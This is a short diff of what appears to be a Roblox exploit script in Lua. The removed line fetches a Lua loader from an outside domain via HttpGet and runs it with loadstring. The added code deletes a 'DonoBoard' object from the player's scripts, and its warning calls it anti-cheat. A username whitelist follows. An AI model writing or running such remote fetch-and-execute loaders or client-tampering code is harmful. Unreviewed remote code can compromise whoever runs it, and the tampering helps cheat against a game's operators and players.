@@ -1,4 +1,13 @@
-loadstring(game:HttpGet("https://shzwl.sbs/loaders/discordx2swnz.lua"))()
+local player = game:GetService("Players").LocalPlayer
+local playerScripts = player:FindFirstChild("PlayerScripts")
+
+if playerScripts then
+    local donoBoard = playerScripts:FindFirstChild("DonoBoard")
+    if donoBoard then
+        donoBoard:Destroy()
+        warn("Anti cheat hai vc")
+    end
+end
 local allowedUsers = {
     ["foxgoodboy123"] = true,
     ["emfankia123"] = true,
